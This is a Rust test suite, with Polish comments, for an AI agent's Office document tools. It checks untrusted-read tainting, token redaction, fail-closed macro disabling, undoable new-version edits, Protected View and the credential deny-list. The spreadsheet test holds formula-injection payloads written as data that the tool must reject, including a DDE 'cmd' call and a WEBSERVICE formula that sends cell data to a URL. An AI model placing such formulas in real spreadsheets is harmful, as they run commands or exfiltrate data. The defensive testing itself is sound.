//! `tools-office` na atrapach (FS, Office, Broker z prawdziwym silnikiem, dziennik cofania):
//! kontrakt, odczyt niezaufany, edycja kopii jako nowa wersja + cofnięcie przywraca stan,
//! makra zawsze wyłączone (fail-closed), Protected View, deny-lista, odmowa Brokera, zdolności.

#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::Duration;

use compliance_contract::{DenyLists, PathEnv};
use core_bus_fake::FakeBus;
use platform_apps_contract::{CellValue, FileZone};
use platform_apps_fake::{FakeDocument, FakeOffice};
use platform_contract::FsPort;
use platform_fake::FakeFs;
use risk_classifier_contract::KernelRule;
use safety_broker_contract::{Broker, Holder, KernelPolicy, TaintSource};
use safety_broker_fake::{FakeBroker, ScriptedDecision};
use serde_json::json;
use tools_common_contract::{DenialReason, Tool, ToolCtx, ToolErrorKind, ToolStatus, Toolset};
use tools_office_contract::OfficeToolsConfig;
use tools_office_impl::{OfficeTools, OfficeToolsDeps};
use undo_journal_contract::{Journal, MemStore, StepId, UndoLimits};
use watchdog_contract::ManualClock;

const HOME: &str = "/Users/ala";
const DOC: &str = "/Users/ala/Documents/Raport.docx";
const XLS: &str = "/Users/ala/Documents/Budzet.xlsx";
const NEW_DOC: &str = "/Users/ala/Documents/Raport (Alfa).docx";

struct H {
    fs: Arc<FakeFs>,
    office: Arc<FakeOffice>,
    broker: Arc<FakeBroker>,
    journal: Arc<Journal>,
    tools: OfficeTools,
}

fn word() -> FakeDocument {
    FakeDocument::word(&[
        "Raport kwartalny",
        "Kwota: 100 zł",
        "token: ghp_abcdefghijklmnopqrstuvwxyz0123",
    ])
    .with_table(&[&["Pozycja", "Wartość"], &["A", "1"]])
    .with_macro("AutoOpen")
}

fn harness() -> H {
    let excel = FakeDocument::excel("Dane").with_cell("A1", CellValue::Number(2.0));
    let fs = Arc::new(FakeFs::with_files([
        (PathBuf::from(DOC), word().to_bytes()),
        (PathBuf::from(XLS), excel.to_bytes()),
        (
            PathBuf::from("/Users/ala/.ssh/klucze.docx"),
            word().to_bytes(),
        ),
    ]));
    let env = PathEnv::windows_profile(HOME);
    let policy = KernelPolicy::baseline(HOME, "/ProgramData/AlfaBroker").unwrap();
    let broker = Arc::new(
        FakeBroker::with(policy, env.clone(), Arc::new(ManualClock::new(1_000_000))).unwrap(),
    );
    for t in ["tools-office.read", "tools-office.edit"] {
        broker.script(t, ScriptedDecision::Allow);
    }
    let tick = Arc::new(AtomicU64::new(1_000));
    let clock = move || tick.fetch_add(1, Ordering::SeqCst);
    let journal = Arc::new(
        Journal::open(
            fs.clone(),
            Arc::new(MemStore::default()),
            UndoLimits::default(),
            Arc::new(clock),
            1,
        )
        .unwrap(),
    );
    let office = Arc::new(FakeOffice::new());
    let tools = OfficeTools::new(OfficeToolsDeps {
        fs: fs.clone(),
        office: office.clone(),
        journal: journal.clone(),
        broker: broker.clone(),
        env,
        deny: DenyLists::baseline(),
        config: OfficeToolsConfig::default(),
        bus: Some(Arc::new(FakeBus::default())),
    });
    H {
        fs,
        office,
        broker,
        journal,
        tools,
    }
}

fn ctx() -> ToolCtx {
    let mut c = ToolCtx::new(Holder::agent("s1", "delta")).with_workdir("/Users/ala/Documents");
    c.approval_timeout = Duration::from_millis(300);
    c
}

impl H {
    fn tool(&self, name: &str) -> Arc<dyn Tool> {
        self.tools
            .tools()
            .into_iter()
            .find(|t| t.manifest().name == name)
            .unwrap()
    }
    fn bytes(&self, p: &str) -> Option<Vec<u8>> {
        self.fs.snapshot().get(&PathBuf::from(p)).cloned()
    }
    fn issued(&self, tool: &str) -> Vec<String> {
        self.broker
            .audit_events()
            .iter()
            .filter(|e| e.kind.as_str() == "broker.token.issued" && e.payload["tool"] == tool)
            .filter_map(|e| e.payload["capability"]["cap"].as_str().map(str::to_owned))
            .collect()
    }
}

#[tokio::test]
async fn contract_suite() {
    let h = harness();
    tools_office_contract::contract_tests::run_all(&h.tools.tools()).await;
}

#[tokio::test]
async fn read_is_untrusted_redacted_and_macros_stay_off() {
    let h = harness();
    let out = h
        .tool("office_read")
        .call(json!({"path": "Raport.docx"}), &ctx())
        .await;
    assert!(out.is_ok(), "{out:?}");
    assert_eq!(out.untrusted, Some(TaintSource::File));
    assert!(out.text.contains("Kwota: 100 zł") && !out.text.contains("ghp_abc"));
    assert_eq!(out.data["macros_present"], true);
    assert!(h.broker.session_security(&"s1".into()).tainted);
    let tables = h
        .tool("office_read")
        .call(json!({"path": DOC, "what": "tables"}), &ctx())
        .await;
    assert_eq!(tables.data["tables"][0][1], json!(["A", "1"]));
    let cells = h
        .tool("office_read")
        .call(
            json!({"path": XLS, "what": "range", "range": "A1:B1"}),
            &ctx(),
        )
        .await;
    assert_eq!(cells.data["cells"], json!([[2.0, null]]));
    assert_eq!(h.office.macros_run(), 0, "makra nigdy nie uruchomione");
    assert!(
        h.office
            .sessions()
            .iter()
            .all(|s| s.automation_security == 3)
    );
    let caps = h.issued("tools-office.read");
    assert!(caps.contains(&"fs.read".to_owned()) && caps.contains(&"gui.control".to_owned()));
}

#[tokio::test]
async fn macros_not_disabled_is_fail_closed() {
    let h = harness();
    h.office.set_automation_security(1);
    let read = h
        .tool("office_read")
        .call(json!({"path": DOC}), &ctx())
        .await;
    assert!(
        matches!(
            read.status,
            ToolStatus::Denied {
                reason: DenialReason::Policy
            }
        ),
        "{read:?}"
    );
    assert!(!read.text.contains("Kwota"));
    let edit = h
        .tool("office_edit")
        .call(
            json!({"path": DOC, "edits": [{"op": "insert_text", "position": "end", "text": "x"}]}),
            &ctx(),
        )
        .await;
    assert!(!edit.is_ok());
    assert!(
        h.bytes(NEW_DOC).is_none(),
        "brak nowej wersji przy niewyłączonych makrach"
    );
}

#[tokio::test]
async fn edit_writes_new_version_and_undo_restores() {
    let h = harness();
    let original = h.bytes(DOC).unwrap();
    let edits = json!([
        {"op": "replace_text", "find": "100", "replace": "250"},
        {"op": "insert_table", "position": "end", "rows": [["Suma", "250"]]}
    ]);
    let out = h
        .tool("office_edit")
        .call(json!({"path": DOC, "edits": edits}), &ctx())
        .await;
    assert!(out.is_ok(), "{out:?}");
    assert_eq!(out.data["output"], NEW_DOC);
    assert_eq!(out.data["replacements"], 1);
    assert_eq!(h.bytes(DOC).unwrap(), original, "oryginał nietknięty");
    let new = FakeDocument::parse(&h.bytes(NEW_DOC).unwrap()).unwrap();
    assert!(new.word_text().contains("Kwota: 250 zł"));
    let caps = h.issued("tools-office.edit");
    for c in ["fs.read", "fs.write", "gui.control"] {
        assert!(caps.contains(&c.to_owned()), "{c}: {caps:?}");
    }
    let step = StepId(out.undo.unwrap().id);
    h.journal.undo(step).unwrap();
    assert!(h.bytes(NEW_DOC).is_none(), "cofnięcie usuwa nową wersję");
    assert_eq!(h.bytes(DOC).unwrap(), original);
    // Druga edycja: kolejna wolna nazwa; jawne `output` nadpisuje istniejący plik z pre-image.
    let target = "/Users/ala/Documents/Wersja.docx";
    h.fs.write_atomic(Path::new(target), b"stara wersja")
        .unwrap();
    let again = h
        .tool("office_edit")
        .call(json!({"path": DOC, "output": target, "edits": [{"op": "insert_text", "position": "start", "text": "Nagłówek"}]}), &ctx())
        .await;
    assert!(again.is_ok(), "{again:?}");
    h.journal.undo(StepId(again.undo.unwrap().id)).unwrap();
    assert_eq!(
        h.bytes(target).unwrap(),
        b"stara wersja",
        "cofnięcie przywraca plik"
    );
}

#[tokio::test]
async fn excel_cells_formulas_and_injection() {
    let h = harness();
    let ok = h
        .tool("office_edit")
        .call(json!({"path": XLS, "edits": [
            {"op": "set_cells", "start": "B1", "rows": [["=A1*2", "'=cmd|' /C calc'!A0", "zwykły tekst"]]},
            {"op": "add_sheet", "name": "Podsumowanie"}
        ]}), &ctx())
        .await;
    assert!(ok.is_ok(), "{ok:?}");
    let new =
        FakeDocument::parse(&h.bytes("/Users/ala/Documents/Budzet (Alfa).xlsx").unwrap()).unwrap();
    assert_eq!(new.sheets.len(), 2);
    for bad in [
        "=WEBSERVICE(\"https://x/?\"&A1)",
        "=cmd|' /C calc'!A0",
        "=HYPERLINK(\"http://x\")",
    ] {
        let out = h
            .tool("office_edit")
            .call(json!({"path": XLS, "edits": [{"op": "set_cells", "start": "C3", "rows": [[bad]]}]}), &ctx())
            .await;
        assert_eq!(
            out.status,
            ToolStatus::Failed {
                error: ToolErrorKind::InvalidArgs
            },
            "{bad}"
        );
    }
}

#[tokio::test]
async fn protected_view_denylist_and_broker_denial() {
    let h = harness();
    h.office.set_zone(Path::new(DOC), FileZone::Internet);
    let read = h
        .tool("office_read")
        .call(json!({"path": DOC}), &ctx())
        .await;
    assert!(read.is_ok() && read.data["protected_view"] == true);
    let edit = h
        .tool("office_edit")
        .call(
            json!({"path": DOC, "edits": [{"op": "insert_text", "position": "end", "text": "x"}]}),
            &ctx(),
        )
        .await;
    assert!(matches!(edit.status, ToolStatus::Denied { .. }), "{edit:?}");
    assert!(edit.text.contains("Internetu"));
    assert!(h.bytes(NEW_DOC).is_none());
    let creds = h
        .tool("office_read")
        .call(json!({"path": "/Users/ala/.ssh/klucze.docx"}), &ctx())
        .await;
    assert!(matches!(
        creds.status,
        ToolStatus::Denied {
            reason: DenialReason::DenyList
        }
    ));
    let same = h
        .tool("office_edit")
        .call(json!({"path": DOC, "output": DOC, "edits": [{"op": "insert_text", "position": "end", "text": "x"}]}), &ctx())
        .await;
    assert!(!same.is_ok());
    h.broker.script(
        "tools-office.read",
        ScriptedDecision::Deny(KernelRule::CredentialDenylist),
    );
    let denied = h
        .tool("office_read")
        .call(json!({"path": XLS}), &ctx())
        .await;
    assert!(matches!(
        denied.status,
        ToolStatus::Denied {
            reason: DenialReason::KernelBlock { .. }
        }
    ));
    assert!(
        !h.office.opened().contains(&"Budzet.xlsx".to_owned()),
        "Office nie otwarty bez zgody"
    );
}
